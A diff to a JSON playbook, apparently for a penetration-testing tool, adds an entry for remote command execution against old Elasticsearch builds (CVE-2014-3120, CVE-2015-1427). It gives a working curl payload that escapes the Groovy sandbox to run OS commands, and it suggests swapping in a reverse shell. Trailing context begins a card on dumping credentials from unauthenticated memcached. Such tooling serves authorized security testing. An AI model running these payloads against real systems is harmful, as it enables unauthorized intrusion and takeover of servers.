@@ -467,6 +467,47 @@
       ]
     },
     {
+      "id": "elasticsearch-rce",
+      "title": "Elasticsearch to Command Execution",
+      "hypothesis": "Old Elasticsearch builds run attacker code through their scripting engine: the dynamic-scripting MVEL path (CVE-2014-3120, <=1.1) and the Groovy sandbox escape (CVE-2015-1427, 1.3.0-1.3.7/1.4.0-1.4.2) both execute OS commands and hand the output back in the JSON response. Check the version the enum reported, then run the matching gadget.",
+      "tool": "curl",
+      "tools": [
+        "curl"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "port:9200",
+        "service.elasticsearch"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 60,
+      "proves": "OS command execution through the Elasticsearch scripting engine — a foothold as the elasticsearch user",
+      "does_not_prove": "a shell on a patched build; the version has to fall in the vulnerable range",
+      "report": {
+        "finding": "Remote Code Execution via Elasticsearch",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://www.exploit-db.com/exploits/36337"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s http://{{target}}:9200/",
+          "note": "Read the version. <=1.1 → CVE-2014-3120 (MVEL); 1.3.x/1.4.x ≤ 1.4.2 → CVE-2015-1427 (Groovy). Pick the matching gadget below."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s 'http://{{target}}:9200/_search?pretty' -d '{\"size\":1,\"script_fields\":{\"x\":{\"lang\":\"groovy\",\"script\":\"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"id\\\").getText()\"}}}'",
+          "note": "CVE-2015-1427 Groovy sandbox escape: the response embeds the command output. `uid=...` is the foothold; swap id for a reverse shell and catch it with the listener card."
+        }
+      ]
+    },
+    {
       "id": "memcached-enum",
       "title": "Memcached Unauthenticated Dump",
       "hypothesis": "Memcached on 11211 is an in-memory cache with no authentication by design. Applications stash session tokens, rendered pages, and sometimes credentials in it, so listing the cached keys and reading their values can hand you a live session or a secret straight out of memory.",
